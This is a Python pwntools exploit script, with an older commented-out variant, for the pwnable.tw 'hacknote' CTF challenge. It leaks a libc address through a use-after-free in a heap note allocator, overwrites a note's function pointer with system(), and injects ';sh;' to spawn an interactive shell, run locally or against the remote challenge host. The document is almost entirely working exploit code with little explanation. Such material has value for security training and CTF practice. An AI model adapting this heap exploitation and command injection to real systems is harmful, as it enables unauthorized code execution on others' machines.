#/usr/env/bin python
#-*- coding: utf-8 -*- 
from pwn import *
import sys
 
def add(Size,Content):
    io.sendlineafter('Your choice :',str(1))
    io.sendlineafter('Note size :',str(Size))
    io.sendafter('Content :',Content)
    io.recvuntil('Success !')
    
def delete(Index):
    io.sendlineafter('Your choice :',str(2))
    io.sendlineafter('Index :',str(Index))
    io.recvuntil('Success')
 
def show(Index):
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(Index))
 
def exploit(flag):
    #leaking libc
    add(100,'A'*4)          #idx=0
    add(8,'/bin/sh\x00')    #idx=1
    add(100,'\n')           #idx=2
    delete(0)
    add(100,'\n')           #idx=3
    # gdb.attach(io,'b *0x8048915')
    show(3)
    if flag==1:
        libc.address = u32(io.recv(4))-0xa-0x1b2700
    else:
        libc.address = u32(io.recv(4))-0xa-0x1b0700
 
    system = libc.symbols['system']
    log.info('system:'+hex(system))
    #binsh_addr = next(libc.search('/bin/sh'))
    #log.info('binsh-address:'+hex(binsh_addr))
    #one_gadget = libc.address+0x3a819
    #log.info('one_gadget:'+hex(one_gadget))
 
    #Use after free
    delete(1)
    delete(3)
    '''
 
       """""""""""""
       "FastbinY[0]"
       """""""""""""
             |
       """""""""""""
       "note_mge 3 "
       """""""""""""
             |
       """""""""""""
       "note_mge 1 "
       """""""""""""
             |
       """""""""""""
       "note_cont 1"
       """""""""""""
    '''
    #Magic:“;”for spilit of command in shell env
    add(8,p32(system)+';sh;') #idx=4
    show(1)
 
    io.interactive()
 
if __name__ == "__main__":
    context.binary = "./hacknote"
    context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./hacknote')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc = ELF('./libc_32.so.6')
        exploit(0)
    else:
        io = process('./hacknote',env={'LD_PRELOAD':'./libc_32.so.6'})
        libc = ELF('./libc_32.so.6')
        # io = process('./hacknote')
        # libc= ELF('./libc_32.so.6')
        exploit(1)


# from pwn import *
 
# hk = process('./hacknote')
# hk = remote('chall.pwnable.tw', 10102)
# libc = ELF('./libc_32.so.6')
 
 
# def goto(n):
#     hk.sendlineafter('Your choice :', str(n))
#     return
 
# def add_note(content, size):
#     goto(1)
#     hk.sendlineafter('Note size :', str(size))
#     hk.sendlineafter('Content :', str(content))
#     return
 
# def delete_note(idx):
#     goto(2)
#     hk.sendlineafter('Index :', str(idx))
#     return
 
# def print_note(idx):
#     goto(3)
#     hk.sendlineafter('Index :', str(idx))
#     c = hk.recvuntil('----------------------', drop=True)
#     return c
 
# def exploit():
#     system_offset = libc.symbols['system']
#     context.terminal = ['tmux', 'new-window']
#     #gdb.attach(hk)
#     add_note("B"*0x80, 0x80)
#     add_note("C"*8, 8)
#     delete_note(0)
#     add_note("", 0)
#     leak = print_note(2)[:4]
#     print(hex(u32(leak)))
#     base = u32(leak) - 0x1ad4d0
#     print("Base libc : {}".format(hex(base)))
#     system = base + system_offset
#     sh = u32(";sh\0")
#     payload = p32(system) + ";sh\0"
#     print("system : {}".format(hex(system)))
#     delete_note(1)
#     delete_note(1)
#     add_note("D"*0x80, 0x80)
#     add_note(payload, 8)
#     goto(3)
#     hk.sendlineafter('Index :', "3")
#     hk.interactive()
 
# def main():
#     exploit()
 
# if __name__ == '__main__':
#     main()